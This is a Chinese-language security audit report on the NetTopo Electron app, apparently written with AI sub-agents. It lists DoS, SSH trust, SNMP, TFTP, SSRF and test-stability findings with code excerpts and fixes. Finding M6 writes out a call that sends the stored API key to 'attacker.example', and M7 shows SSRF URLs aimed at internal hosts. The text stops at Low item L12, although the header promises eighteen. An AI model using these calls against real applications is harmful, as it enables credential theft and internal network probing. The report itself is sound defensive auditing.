# NetTopo 全面代码审计与安全审计报告 — 第三轮（2026-09-10）

> 报告文件：`REVIEW-安全审查-20260910-R3.md`
> 审计对象：工作区 `D:\zcode\nettopo`（HEAD `fc5aa55` **+ 15 个文件 545 行未提交改动**，见 §1.2）
> 审计方式：5 个独立子代理分模块全量通读 + 主代理交叉复核；60k 轮解析器 fuzz；真实 socket 端到端复现；IPC 面机械抽取比对
> **本轮未修改任何产品源码**（全部证据为 `test/_audit*.js` 临时脚本，可用后删除，见 §9）

---

## 1. 范围、基线与方法

### 1.1 范围（约 3.5 万行）

| 分组 | 文件 |
| --- | --- |
| 主进程与边界 | `electron-main.js`(1878)、`preload.js`(187)、`js/updater.js`、`js/ai-llm.js`、三份 HTML 的 CSP 与 webPreferences |
| 网络服务 | `js/svc-tftp.js`、`js/svc-ftp.js`、`js/svc-syslog.js`、`js/svc-trap.js`、`js/snmp-v3.js`、`js/net-services.js` |
| Shell/监控/备份 | `js/shell.js`、`js/monitor.js`、`js/backup-store.js`、`js/config-backup.js`、`js/maintenance.js`、`js/log-search*.js` |
| 渲染层 | `js/app.js`(9142)、`js/util.js`(3109)、`js/render.js`、`js/model.js`、`js/layout.js`、`js/diag.js`、`js/regex-lab*.js`、`js/shell-ui.js`、`js/webview-ui.js` |
| 导出与构建 | `js/vsdx.js`、`js/visio.js`、`js/pdf.js`、`bump-version.js`、`gen-checksums.js`、`build.bat`、`启动.bat`、`.github/workflows/ci.yml` |
| 测试 | `test/run-tests.js`(6204) 及其守卫有效性 |

### 1.2 基线的重要事实（影响结论解读）

1. **工作区是脏的**：`git diff --stat` 显示 15 个文件共 545 行未提交改动（`electron-main.js` +102、`test/run-tests.js` +225、`js/svc-trap.js` +51、`js/app.js` +46 等），改动时间集中在 2026-09-10 12:43–12:59（本次审计开始前约 10 小时）。**本轮审计针对的是这份「HEAD + 未提交补丁」的工作区**；补丁本身尚未 commit，也未随任何报告归档。历届报告中的「已修」结论，如未提交，均应在提交后重新确认。
2. **已核实本次审计未改动产品源码**：所有产品文件的 mtime 均早于本次会话（22:44 之后仅新增 `test/_audit*.js`、`test/_audit_r3_out/` 等临时物）。
3. **本机 Node 为 v26.5.1，CI 用 Node 20**；下文「测试套件崩溃」（M7）在本机复现，CI 上的概率未验证。
4. `read` 工具单次返回在约 44KB 处**静默截断**：首读 `electron-main.js` 只得 968/1878 行、100 个 handler 只看到 42 个。本报告涉及的全文阅读均已改为 ≤1000 行分块并校验行号连续；**后续审查请一律分块读，否则会系统性漏读大文件后半段**。

### 1.3 方法

- 逐行通读 + 与 6 份历史报告（`REVIEW-*`）逐条比对，区分「新发现 / 历史已列未修 / **声称已修实际可绕过**」。
- 机械抽取 `preload.js` 暴露面与 `ipcMain.handle/on` 全量通道做一一对应；抽取 421 个正则做回溯形态扫描；抽取全部 innerHTML 插值做来源回溯。
- 对抗性实测：路径清洗 33 组恶意输入、导航白名单 25 组变体、XML/ZIP/PDF 注入载荷、5 个网络解析器 60k 轮 fuzz、33 个渲染层纯函数 400 轮 fuzz、真实 ssh2/dgram/HTTP 服务端到端复现。

---

## 2. 总体结论

**没有发现 Critical（远程未授权 RCE / 任意文件读写 / 凭据直接泄露）问题。** 架构性防线（三窗口 `contextIsolation+nodeIntegration:false+sandbox:true`、CSP 无 `unsafe-eval`、IPC 全部带 sender 守卫、路径「白名单 + resolve + 前缀终判 + 拒符号链接」四层、safeStorage 无明文降级、SSH 指纹 TOFU 语义）经本轮复核**全部在位且无可绕过路径**。

风险集中在两类：

1. **「封顶即静默丢弃」与「键语义不一致」**：为了抗 DoS 加的各类上限（目录数、会话数、缓存）缺少淘汰/回收机制，被攻击者一次打满后**长期无法自愈且界面无感知**（H1、M4）；指纹信任库的键在不同层之间口径分裂（M1、M2）。
2. **上一轮「声称已修」的补丁不完整**（7 项）：AI Key 的 http 拦截可被 https 一步绕过（M5）、v3 KDF 缓存对远程随机 engineID 无效（M3）、TFTP 每 IP 配额对伪源无效（M4）、命令控制字符仅清洗了 host/username（L3）、工程对比路径漏了 20MB 限制（L1）、录像归属校验未收紧到 Shell 窗口（L8）、导出 canvas 上限被 0.1 下限顶掉（L7）。

| 级别 | 数量 | 编号 |
| --- | --- | --- |
| Critical | 0 | — |
| High | 1 | H1 |
| Medium | 9 | M1–M9 |
| Low | 18 | L1–L18 |
| Info | 9 | I1–I9 |

---

## 3. High

### H1 主机目录数封顶无淘汰机制：任意 LAN 主机约 6 秒即可让 Syslog / Trap 归档**永久失效且静默**

- **位置**：`js/svc-syslog.js:28,418-431,445,448-476,494-500`；`js/svc-trap.js:471-483,501,519,526-528`
- **现状代码**：
```js
// svc-syslog.js:428-431 —— 超限的新主机只进环形缓冲，直接 return，无计数、无告警
if (!this.hostDirs.has(hostDir)) {
  if (this.hostDirs.size >= MAX_HOST_DIRS) return;
  this.hostDirs.add(hostDir);
}
// svc-syslog.js:463 —— 近 1 小时有写入的文件不清（攻击者持续刷新 mtime 即永不清理）
if (fst.mtimeMs > Date.now() - 3600000) continue;
// svc-syslog.js:472 —— 只有「空目录」才释放名额；攻击者目录内含当日 .log，rmdir 永不成功
try { fs.rmdirSync(hd); if (this.hostDirs) this.hostDirs.delete(host); } catch (e) { /* 非空：忽略 */ }
```
- **问题**：目录名取自**消息体自报的 HOST**（syslog）或**可伪造的 UDP 来源 IP**（trap），二者都不需要任何认证。攻击者发 1024 条约 50 字节的报文（限速 `maxPerSec=200` → 约 5–6 秒）即可占满全部名额；此后：
  1. 所有**主机名不在攻击者集合内**的真实设备的日志**只进内存环形缓冲、不再落盘**——运行期无法察觉（面板照常实时滚动日志）；
  2. 名额**不会回收**：攻击者目录内有当日 `.log`，`rmdirSync` 永不成功；`keepDays=90` 且 `_cleanupOld()` 仅在构造函数（`svc-syslog.js:207`）与**跨日时**（`:409`）执行，配合 1 小时 mtime 守卫，攻击者每天补发 1024 条即可无限期维持；
  3. `status()`（`:494-500`）**没有「未归档」计数**，「静默丢弃」在 UI 上完全不可见。
- **危害**：这是产品核心功能（设备日志集中归档 + 合规巡检取证）的**远程未授权持久化破坏**。断电重启、重启服务都无济于事（重启只是从磁盘重建同样满的集合）。日志缺失还会连带影响 syslog 关键字告警的检索链与合规审计的可追溯性。
- **验证**：子代理实测（`test/_audit3_syslogcap.js`）：单机 1024 条消息耗时 **5.8s** → 落盘目录 1024；随后真实设备 `REAL-DEVICE-01` 的消息「环形缓冲可见=true / 磁盘目录存在=**false**」。trap 侧（`test/_audit3_trap.js` C 段）预置 1024 个来源目录后，真实来源 `127.0.0.1` 的 trap 同样不落盘。主代理已逐行核对上述四处代码路径与常量。
- **修复建议**：
  1. 名额改为 **LRU 淘汰**（写入时 move-to-end，满时逐出最久未使用主机并 `end` 其写流），保证新来源永远有槽；
  2. `_cleanupOld()` 顺带剔除磁盘上已不存在的 `hostDirs` 条目，使手动清理可在运行期自愈；
  3. 新增 `stats.diskDropped` 并在 `status()`/面板显示，消除「静默」；
  4. （可选）对 syslog 的 HOST 字段加长度/字符白名单，降低单包建目录的收益。

---

## 4. Medium

### M1 主机指纹信任库以 host 为键（不含端口）：NAT 端口转发场景被误判为中间人攻击，且监控任务被**永久置 fatal**

- **位置**：`js/monitor.js:708,1832-1856`；`js/shell.js:96,307-323`
- **现状代码**：
```js
// monitor.js:708
this.trusted = new Map();    // host -> fp      ← 只有 host，没有 port
// monitor.js:1836-1846
const known = this.trusted.get(host);
if (known) { if (known === fp) { ...通过... } else {
  job.statusText = '主机指纹变化，可能遭到中间人攻击，已拒绝连接';
  job.fatal = true; this._emit(job, 'error', job.statusText); this._teardown(job, false); return; } }
```
- **问题**：SSH 主机密钥按「主机 + 端口」隔离，`10.0.0.1:22` 与 `10.0.0.1:2222` 经 NAT 转发到两台不同设备是内网常见形态。渲染层**早已按 `host:port` 记忆**（`js/app.js:321`，注释明写「只按 host 存储会互相挤掉」；`js/shell.js:435-436` 也有同口径注释），主进程信任库却仍是 host-only。后果：先连 :22 记录 fpA → 再为同 IP 的另一端口建任务 → `known=fpA !== fpB` → 判为中间人 → **任务 permanent fatal、不再重连**，界面只弹一次「可能遭到中间人攻击」，随后监控从列表静默消失。附带不一致：`_runBackupOwn`（`monitor.js:2101-2106`）遇到同样情形只 `fail()` 不置 fatal，于是同一条「指纹变化」让主会话永久死掉、独立备份却每轮重试刷通知。
- **验证**：子代理实测（`test/_audit_fp.js`，真实 ssh2 起同一 127.0.0.1 上两个不同主机密钥的端口）：`指纹变化拒连事件数: 1 → [{"state":"error","text":"主机指纹变化，可能遭到中间人攻击，已拒绝连接"}]`；且同批实验证明并发握手**不会**互相放行（指纹事件在主进程内同步处理），故这里不存在在线绕过，只有键语义错误。
- **修复建议**：信任键统一为 `host:port`（默认 22 省略后缀以兼容既有 `monitor-trust.json`）；`trusted`、`_pendingVerify`、`trustFingerprint`、`monitor:trust-list/revoke` 一并改。

### M2 无人值守采集（`runOneShot`）完全不查信任库：已钉扎主机的指纹变化被静默接受，并经渲染层**反写成长期钉扎**

- **位置**：`js/shell.js:429-444`；`js/app.js:322-331,431`
- **现状代码**：
```js
// shell.js:433-439
} else if (info.state === 'fingerprint') {
  // 无人值守采集的指纹语义与监控一致：首次连接自动信任（TOFU），变化拒绝由渲染层传入 expectFp 严格比对。
  const fh = String((info && info.host) || host);
  fpOut.v = { host: fh, port: info.port, fp: String(info.fp || '') };
  try { this.trustFingerprint(fh, true, 'monitor'); } catch (e) { /* ignore */ }
}
```
- **问题**：该分支**无条件放行**——既不查 `MonitorManager.trusted`（「已钉扎、变化即拒」的唯一权威副本），也不比对任何既有记录；渲染层唯一写入 `topoShellFp:*` 的时机恰是 oneshot 回传的指纹（`app.js:431 → rememberTrustedFp`）。于是：信任库已钉扎 fp_real 的主机，一次 oneshot（右键「从邻居表导入」/ MAC·ARP 定位）若遇到被替换的主机密钥，会 `ok:true` 正常返回，并把 **攻击者指纹写成渲染层长期钉扎值**；此后 Web Shell 重连与监控任务都以攻击者指纹做「严格比对」，**真实设备反被拒**。该路径的采集命令与凭据（含密码/私钥）全部发给冒充者。
- **验证**：子代理实测（`test/_audit_trust2.js`）：先用监控任务 TOFU 记录 127.0.0.1 指纹 A，再对同 host 另一端口（另一把主机密钥）执行 `runOneShot` → `ok=true err=null`，回传指纹与信任库不同；对照监控路径对同一情形是拒连的。主代理已核对该分支代码。
- **修复建议**：信任判定收敛到一处——oneshot 收到 fingerprint 事件时先查主进程信任库：有记录且不一致 → `verify(false)` 并回传错误；无记录 → TOFU 记录后放行。渲染层在「`expectFp` 为空但主进程已有记录」时不得覆盖写入。

### M3 SNMP v3：KDF 缓存键包含**包内自报的 engineID**，未认证远程包可稳定消耗约 32% 单核（L17「已修」实为可绕过）

- **位置**：`js/snmp-v3.js:117-142,416-425`；`js/svc-trap.js:269-270,376-380`
- **现状代码**：
```js
// snmp-v3.js:129 —— 缓存键含 eid，而 eid 来自报文
const ck = hashName + '\u0000' + eid.toString('hex') + '\u0000' + pwd.toString('base64');
// snmp-v3.js:132-138 —— 未命中即 1MB 填充 + 两次哈希
const ext = Buffer.alloc(1024 * 1024); for (...) pwd.copy(ext, off, ...);
const h1 = crypto.createHash(hashName).update(ext).digest();
// snmp-v3.js:416 vs 422-424 —— 先派生 Kul，后比对 HMAC
const kul = passwordToKey(u.authPass, Buffer.from(engineID, 'hex'), u.authProto);
const expect = authDigest(masked, kul, u.authProto);   // 验证在这里
```
- **问题**：RFC 3414 的 1MB 口令扩展**与 engineID 无关**，但实现把 engineID 放进缓存键，而 trap 侧 engineID 完全由发送方自报——每包换一个 engineID 即缓存永不命中，**每包做一次 1MB 分配 + 两次哈希，且发生在 HMAC 比对之前**（无需任何凭据，只要包结构合法、flags 声明认证、userName 与本端配置同名即可命中该分支；SNMP 用户名并非秘密，抓一个合法包即可得到）。`TrapServer` 默认限速 100pps ≈ **32% 单核持续占用**；缓存仅 64 项且键可被撑大（engineID 上限 64KB → hex 键 128KB），随机 engineID 洪泛还会把真实设备的缓存项挤掉。
- **验证**：子代理实测：缓存命中 `0.004ms` vs 未命中 `3.204ms(sha)/3.729ms(md5)`（**857×**）；端到端真实 TrapServer 收 200 个「结构合法、engineID 随机、签名错误」的包耗时 897ms（4.49ms/包，`v3AuthFail=200`），对照未配 v3 用户同批 319ms。主代理已核验缓存键构造与「先派生后验签」的顺序。
- **修复建议**：把 `passwordToKey` 拆两段——按 `(algo, 口令)` 缓存与 engineID 无关的 1MB 中间值，再按 `(中间值, engineID)` 做廉价 finalize（`Kul=H(x‖engineID‖x)` 只有一次小哈希）；并按 RFC 3414 限制 engineID 5..32 字节，超限拒包。

### M4 TFTP 会话槽可被**伪造源 IP** 占满：真实设备恒收 `ERROR 4`（首轮 L15 的每 IP 配额被绕过）

- **位置**：`js/svc-tftp.js:430-442`
- **现状代码**：
```js
if (this.sessions.size >= this.maxSessions) { this.stats.denied++; this._sendErrorTo(rinfo, 4, 'Too many sessions'); return; }
let perIp = 0;
for (const s of this.sessions.values()) { if (s.peer.address === rinfo.address) perIp++; }
if (perIp >= this.maxSessionsPerIp) { this.stats.denied++; this._sendErrorTo(rinfo, 4, 'Too many sessions for this host'); return; }
```
- **问题**：配额键是 **UDP 源地址**，而 UDP 源地址可任意伪造，首包无需任何确认即建档。攻击者用 2 个伪源各发 4 个 WRQ（共 8 个包）即占满 `maxSessions=8`；慢会话靠 `SESSION_IDLE_MS=30s` 过期，每 30 秒补发 8 个包即可无限期维持饱和 → **所有真实设备的 `copy running-config tftp://` 恒得 ERROR 4**，面板只有 denied 计数上涨。首轮 L15 的「每 IP 配额」修复正是被伪源这一点绕过。
- **验证**：子代理实测（`test/_audit3_tftp2.js` 场景 2，loopback 绑定两个伪源地址）：两轮「2 伪 IP × 4 WRQ」后，真实来源的 WRQ 均返回 `ERROR 4 Too many sessions`。主代理已核对配额键与常量。
- **修复建议**：伪源下按 IP 配额无防护价值，应改为不依赖源地址的机制：① 未开始数据交互的会话用初始握手超时 3–5s（而非 30s 空闲）；② 全局新建会话速率限制；③ 保留槽位只给「已有数据块进展」的会话（WRQ 收到 DATA / RRQ 收到 ACK 才占用持久名额）。

### M5 TFTP RRQ 无握手先发 DATA 且自动重传 6 次：16B 请求 → 3.5KB 反射（放大 129–225×）

- **位置**：`js/svc-tftp.js:23-24,137-145,101-105`
- **现状代码**：
```js
if (!this._openRead()) return;
if (accepted.length) this._send(this._oack(accepted));
else this._sendNextData();          // 无选项时直接发 512B DATA1，不等任何确认
// _retransmit: if (++this.retries > MAX_RETRIES) {...}  MAX_RETRIES=6, RETRANSMIT_MS=1000
```
- **问题**：RRQ 是纯盲包，服务端对伪造源直接回 DATA1 并每秒重发、最多 7 次 ≈ 3.5KB，对 16B 请求放大 **225×**（标准 UDP 反射/放大形态）。前提是 `<root>/<伪源IP>/<文件名>` 存在——而该目录正是设备推送配置的落盘位置，文件名在面板示例中可猜（`r1.cfg`、`vrpcfg.zip`），所以对「刚推送过配置的设备」可直接反射。带 `blksize` 选项时先 OACK 等 ACK0，无法进一步放大。
- **验证**：子代理实测（`test/_audit3_tftp2.js` 场景 3）：16B 请求，3.3s 内收到 4 包/2064B（129×）；按完整重试预算 7 包/3612B = 225×。主代理已核对 `MAX_RETRIES/RETRANSMIT_MS` 与直接发 DATA1 的分支。
- **修复建议**：RRQ 强制 OACK 握手（即使无选项也先 OACK 等 ACK0 再发数据），或把首块重传降为 0–1 次；本产品面板只用 WRQ，可考虑给 RRQ 加开关默认关闭。

### M6 已存 AI API Key 可被渲染层**一步**外发（第二轮 M3「http 拦截」修复可绕过）

- **位置**：`electron-main.js:1430-1443,1483-1493`；`js/ai-llm.js:41-49,524-530,622-628`
- **现状代码**：
```js
// electron-main.js:1433-1434 —— M3 的修复只挡 http:
const apiKey = (apiKeyStored && !isHttpsUrl(baseUrl)) ? '' : apiKeyStored;   // http 端点不携带已存 Key
// electron-main.js:1489-1490 —— ai:list-models 显式按 https 回退「已存 Key」
let apiKey = String((p && p.apiKey) || '');
if (!apiKey && isHttpsUrl(baseUrl)) apiKey = aiCfgFromSettings().apiKey;
// ai-llm.js:626-627 —— Key 随请求头发往 baseUrl 指定的任意主机
} else if (this.apiKey) { headers['Authorization'] = 'Bearer ' + this.apiKey; }
```
- **问题**：两条等价路径各只需**一次**渲染层 invoke：① `topoAI.listModels({ baseUrl:'https://attacker.example', apiKey:'' })` —— 空 Key 触发 `:1490` 的 https 回退，主进程把**已存 Key** 作为 `Authorization: Bearer …` 发往渲染层指定的主机；② `ai:set-config({ baseUrl:'https://attacker.example' })`（不触碰 Key 字段，`:1472-1473` 的「空串=保持不变」使 Key 原样保留）后触发任意一次 `ai:test`/`ai:analyze`。M3 的立论是「渲染层 CSP 禁直连外网、主进程代发不受限」——该立论对 https 同样成立：**TLS 只保护传输，端点本身就是攻击者**。修复只把攻击成本从「改 http 地址」抬到「改 https 地址」，未触及根因（渲染层可单方面改端点而保留凭据）。
- **验证**：子代理实测（`test/_audit_r3_ai.js`，真实 `AiClient` 打桩 `https.request` 捕获出网载荷）：`Authorization = "Bearer sk-live-SECRET-…"` 发往 `attacker.example`，断言 PASS；同时验证 http 分支确实已被挡住（M3 在位）。主代理已核对上述四处代码。
- **修复建议**：端点与凭据**同一次确认**——`ai:set-config` 变更 baseUrl 主机时，若已有 `apiKeyEnc` 则要求显式确认或连同 Key 重填（否则清空）；`ai:list-models` 的回退改为「仅当 baseUrl 主机与已存配置一致时才回退」。

### M7 渲染层可控 `baseUrl` → 主进程成为通用 HTTP 客户端（SSRF / 绕过 CSP `connect-src` / 任意数据外发）

- **位置**：`electron-main.js:1483-1493,1494-1538`；`js/ai-llm.js:41-49,68-74,434-441,549-555`
- **问题**：`validateBaseUrl` **只查协议，主机/端口/内网地址一律放行**；`ai:list-models` 的 baseUrl 与 apiKey 全部取自渲染层 payload。渲染层只需 `listModels({ baseUrl:'http://127.0.0.1:9200/_search?x=' })` 即可让**主进程**向任意主机/端口/路径发 GET，并把非 200 响应体前 300 字节（`:434-441`）回传；`ai:set-config` + `ai:analyze` 给出 POST 语义。三重影响：① 内网探测/信息读取；② **渲染层 CSP `connect-src 'self'` 被绕过**（渲染层自身无法出网，主进程代发是唯一通道）；③ 任意数据外发（剪贴板 `pasteText()`、`secure:decrypt` 解出的设备口令、工程/日志内容经 prompt 进入 POST 体）。
- **验证**：子代理实测：本地 HTTP 服务收到主进程代发的 `GET /internal/admin/secret?pad=/models`，`listModels` 返回的 error 携带 300 字节内部响应；`chat()` 实测发出 `POST /internal/api?x=/chat/completions`，body 为渲染层构造的任意文本。
- **修复建议**：① 渲染层可传的 baseUrl 限「https，或 http 且主机为回环/私有网段」并显式提示；② 服务端错误体不再回传（只回状态码 + 固定文案）；③ 端点改为「设置里保存、主进程只读」，渲染层不再逐次指定；④ 保留 http 本地 Ollama 时，对 127.0.0.1 之外要求显式确认。

### M8 `job.ifOperPrev` 无任何上限/清理：恶意 SNMP 设备可推动主进程内存无界增长

- **位置**：`js/monitor.js:983,1577-1584`
- **现状代码**：
```js
const po = job.ifOperPrev[s.i];        // ifIndex 来自设备返回的 OID 后缀
if (po && po !== s.oper) changes.push({ name: s.n, from: po, to: s.oper });
job.ifOperPrev[s.i] = s.oper;          // 只增不减，全模块无删除/上限
```
- **问题**：同函数其余会话级状态都有界（`ifHist` → `IF_HIST_MAX=120`，`perfHist`/`metricHist`/`httpHist` 均 shift 截断，`ifPrev` 每轮整体替换），**只有 `ifOperPrev` 漏了**。恶意/被入侵设备每轮回一批全新 ifIndex 即线性累积：轮询下限 30s，最坏 2048 新键/次 × 2880 次/天 ≈ 590 万键/天，数百 MB 量级，最终拖垮整个桌面应用（含全部监控任务）。
- **验证**：子代理实测（`test/_audit_snmp_growth.js`，require 前替换 `dgram.createSocket` 为手写 BER 假 agent）400 轮后 `ifPrev` 键数 300→600→900→1200 线性增长，而 `ifHist` 稳定在 120 份（上限生效），证明增长只来自 `ifOperPrev`。主代理已 grep 确认 `ifOperPrev` 全模块仅三处（初始化/读/写），无清理。
- **修复建议**：每轮用「本轮出现的索引集合」重建 `job.ifOperPrev`，或在超过 4096 键时整体重置；并对 ifIndex 数值设上限。

### M9 单测套件**随机崩溃**（本机 6 次运行死 2 次，约 1/3）：服务启动失败后测试继续用端口 0，且无全局异常兜底

- **位置**：`test/run-tests.js:6324-6337`（syslog 用例）、`:4566`（`sendUdp`）；`js/svc-syslog.js:210-274`
- **现状代码**：
```js
// run-tests.js:6328-6331 —— 忽略 start() 返回值，直接用 .port
await srv6.start(0, true);
const cs6 = netX.connect(srv6.port, '127.0.0.1');   // start 失败时 srv6.port 仍为 0
await new Promise((res) => cs6.once('connect', res)); // 且未挂 error 监听
// run-tests.js:4566
const sendUdp = (msg, port) => new Promise((res) => us.send(Buffer.from(msg), 0, Buffer.byteLength(msg), port || ssrv.port, ...));
```
- **问题**：两条独立崩溃路径，共同根因是「**测试忽略 `start()` 结果，失败后继续用 `port === 0` 收发**」：
  - **路径 A（主代理已定位并证明）**：`SyslogServer.start(0, true)` 先让 UDP 绑定临时端口，再令 **TCP 监听同一个端口号**（`svc-syslog.js:256`）。Windows 的 TCP 临时端口区间与 UDP 重叠，该端口可能已被占用 → TCP bind 失败 → 走 `failTcp` 分支 `resolve({ok:false})`，而 `this.port` **保持 0**。测试不检查返回值，`net.connect(0, '127.0.0.1')` 异步抛 `EADDRNOTAVAIL`，而该 connect 未挂 `error` 监听 → **未捕获 'error' 事件 → 整个测试进程死亡**。
  - **路径 B**：另有用例使用固定保留端口（`54321`），在 Hyper-V/WSL 保留段或防火墙策略下 `listen EACCES`，`start()` 失败同样留下 `port === 0`，随后 `:4566` 的 `udp.send(..., 0, ...)` 抛未捕获 `RangeError [ERR_SOCKET_BAD_PORT]`。
  - 测试进程**没有 `uncaughtException` 兜底**（全文只有 `:6421/:6424` 的 `process.exit`），所以一旦触发就是「测试还没跑完就退出」，**后续用例全部未执行**——真实回归可能被一次无关崩溃掩盖。
- **验证（主代理实测）**：① 单次 `SyslogServer.start(0,true)` 400 轮循环 → 1 次 `{ok:false,error:'端口已被占用…'}` 且 `port==0`（0.25%）；② `net.connect(0,'127.0.0.1')` 复现出与崩溃日志**逐字节相同**的 `connect EADDRNOTAVAIL 127.0.0.1 - Local (0.0.0.0:62991)`；③ 连跑 3 次完整套件：2 次 `exit=0 / 结果：1570 通过，0 失败`，1 次 `exit=1`（尾部为 `Node.js v26.5.1` 崩溃转储）；加上此前 1 次相同崩溃，**合计 6 次运行崩溃 2 次**。子代理亦独立撞到路径 B 的同型失败（`listen EACCES 0.0.0.0:54321` → `ERR_SOCKET_BAD_PORT`）。
- **危害**：CI 对每次 push/PR 在 2 个平台上跑该套件，本缺陷会以「随机红」形式出现；由于进程提前退出，还会与真实回归混淆。项目约定「改动后必跑且须全绿」在本机已经无法稳定满足。
- **修复建议**：① 所有服务用例改为 `const r = await srv.start(...); if (!r.ok) throw new Error(...)` 或直接跳过；② 所有客户端 socket 一律挂 `error` 监听；③ 测试入口加 `process.on('uncaughtException')`，打印当前用例名后再退出；④ `SyslogServer.start(0, true)` 的「TCP 跟随 UDP 临时端口」本身是竞态设计（生产走 `clampPort` 固定端口故不受影响，测试才暴露），可改为失败时回退「TCP 绑定 0」或允许二者端口不同。

---

## 5. Low（18 项）

| # | 位置 | 问题 | 验证 | 历史关系 |
| --- | --- | --- | --- | --- |
| L1 | `js/app.js:2071-2089`（`openProjectDiff`）对照 `:2822-2828` | 「工程对比」未同步 20MB 上限：同一 `readFile+decodeBytes+parseProjectText`（内部同步 `JSON.parse`，加密信封还会走 PBKDF2-120000+AES-GCM+atob）链路，选个数百 MB 文件即冻结渲染线程。 | 静态核对（`git diff` 显示 L13 补丁只落在 `loadProject`） | **L13 声称已修、实际漏改同类路径** |
| L2 | `js/util.js:478-482`、`:612-624`、`:1623-1624`；`js/render.js:295-343` | `node.type`/`node.vendor` 只过 `SAFE_ID` 未过 `BAD_ID`：`type:"constructor"` 使 `U.getType` 取到 `Object` 构造函数（label/c1 全 undefined → 节点文字渲染成 "undefined"、渐变引用失效）；`vendor:"constructor"` 使 `U.cfgTemplates()['constructor']` 返回 `Object` → **生成配置整体退化为字符串 "undefined"**，用户可能直接刷进设备。 | **主代理与子代理各自独立复现**（`test/_audit_vendor_proto.js` / `test/_audit_proto_type.js`）：`getType(constructor) -> {}`、`生成配置（vendor=constructor）: "undefined\n"` | 新发现（与首轮 L7/L14 同族不同点：键合法但**取值走原型链**） |
| L3 | `js/monitor.js:786-791,794-802,831-845` 落点 `:1270-1285` | `commands`/`onConnect`/告警 `pattern` 只做 `trim` 未剔控制字符，中段换行在 `_logLine` 逐行写文件时产生**可自带时间戳的伪造审计行**（同文件里 host/username 已清洗）。 | 子代理实测（`test/_audit_loginject.js`）：日志出现 1 行与真实行无法区分的伪造行 | **L3 声称已修、实际只修了 host/username** |
| L4 | `js/monitor.js:989-991,1465-1468` | HTTP 健康探测 URL 若内嵌凭据（`https://admin:口令@设备/`，Node 会自动发 Basic）会被**原样写进监控日志**、经 `emit('http')` 回传渲染层、写入事件时间线并拼进系统通知正文，且不覆盖 `pwMasks`。 | 子代理实测（`test/_audit_paths.js` 场景 B）：日志命中明文口令 | 新发现（违反 AGENTS.md「密码加密落盘」与项目凭据打码口径） |
| L5 | `js/monitor.js:1114-1119`；`js/app.js:321-331,7085-7128` | 「已信任的主机·撤销」只清主进程库，**不清渲染层 `topoShellFp:*` 钉扎**；渲染层连接时优先以其作 `expectFp` 严格比对，于是设备合法换钥后直接报「指纹不匹配」且**不弹确认框**，UI 无其它入口清除（全仓 `localStorage.removeItem|clear` 出现 0 次）。 | 静态穷举 + grep | 首轮 L2 的「信任库管理入口」补齐不完整 |
| L6 | `js/monitor.js:2082-2089,2118-2120` | 独立连接备份的 `connTimer` 在失败路径未清除且 `fail()` 不判 `settled`：15s 后**重复上报一次失败**（再弹系统通知）并把 `backupLast.error` 覆盖成与实际原因无关的「备份连接超时」。 | 子代理实测（`test/_audit_bkdup.js`）：同一轮收到 2 条 backup 事件，终态错误为「备份连接超时」 | 新发现（同函数前一轮修的是监听器未摘） |
| L7 | `js/app.js:2433-2438` | `return Math.max(0.1, Math.min(s, 4))` 的 **0.1 下限顶掉了 `MAX_SIDE=12000` 保护**：由洗清后合法极限坐标（±1e6）生成的 SVG 可达 2000280×2000176px，`s=0.006` 被顶成 0.1 → canvas 200028px，远超 Blink 单边上限 → `toDataURL` 返回 `"data:,"` → PDF/PNG 导出**直接失败**（而非注释声称的「自动降 scale」）。触发阈值：SVG 单边 > 120000px。 | 子代理实测（`test/_audit_r3_exports.js` C 节）；主代理已核对代码 | **REVIEW-复审-20260902「canvas 尺寸上限（12000px，超限自动降 scale）」声称已修、实际可绕过** |
| L8 | `electron-main.js:501-534`（`shell:record-*`） | 归属校验只做「绑定发起窗口」：主窗口在无录制时调用 `recordStart()` 即自任 owner，随后 `recordAppend`/`recordStop` 必然通过 → 被注入的主窗口可**凭空生成合法命名的审计录像**。全库检索确认录像 UI 只存在于 `shell-ui.js`，`app.js` 对 `record*` 调用数为 0。 | 静态逐行 + grep（主代理已核对守卫逻辑） | **第二轮 L8 声称已修、未按建议收紧到 shellWin** |
| L9 | `js/app.js:2416-2422`；`js/vsdx.js`（全文 **0 处** `icon`） | 导出前对 SVG 图标做 N 次 canvas 光栅化，但 `buildVSDX` 只读 `U.getType(n.type).img` 从不读 `n.icon`（`git log -S 'icon' -- js/vsdx.js` 无输出；画布优先级见 `render.js:299-302`）→ **设备级自定义图标在 Visio 导出中恒丢失**，且每次导出白做数百次光栅化。 | 子代理实测 + 主代理 grep 确认 `vsdx.js` 中 `icon` 出现 0 次 | **60e8447「第八轮…VSDX SVG 光栅化」落在读取端不存在的字段上，修复无效** |
| L10 | `js/regex-lab.js:49-61`（关键 `:53`） | worker 对单条非法正则返回 `{ok:false,error}`，宿主**无条件改写成 `ok:true`** 并丢弃 error：调用方无法区分「跑了没命中」与「规则坏了」，`monitor.js:2266` 的「无法评估」分支成死代码（当前入线程前有 `new RegExp` 预校验，故不可达——潜伏缺陷）。 | 子代理实测（`test/_audit_r3_regexlab.js`）：`run([{pattern:'['}])` → `{ok:true,hit:false}`；直连 worker → `{ok:false,error:…}` | 新发现 |
| L11 | `gen-checksums.js:15` | `NAME_RE = /^[^\\/]+\.(\d{8}[a-z]-portable\.exe|exe|AppImage)$/i` 的第一分支要求日期戳前紧跟 `.`，而产物名是 `…-1.0.0-20260909a-portable.exe`（`-` 在前）→ **第一分支永不命中**，退化为「任何 `.exe`」。本机 `dist/portable` 实测含 7 个历史版本 exe，且**每个都有对应 `.sha256`**；若发布时上传整个目录，`updater.pickAssets` 取「第一个 `-portable.exe`」且同名清单天然匹配 → 用户可能「升级」到旧包且校验通过。 | 主代理实测正则（6/6 个样本全部 true）+ `dist/portable` 列表实证 | 新发现（历届只审 updater 下载与校验，未审产物命名与清单覆盖的耦合） |
| L12 | `js/svc-syslog.js:436-441,445`；`js/svc-trap.js:487-493,501` | 落盘写流不检查 `write()` 返回值、无背压/积压上限；此类「每主机每日」写流长期存活（不像 FTP/TFTP 受单文件上限约束），慢盘或网络盘挂起时用户态缓冲无界增长（限速 200 条/s × 8KB ≈ 1.6MB/s 可持续灌入）。 | 静态分析（第二轮只记录过 FTP/TFTP 同型问题，落点不同） | 新发现（同类不同落点） |
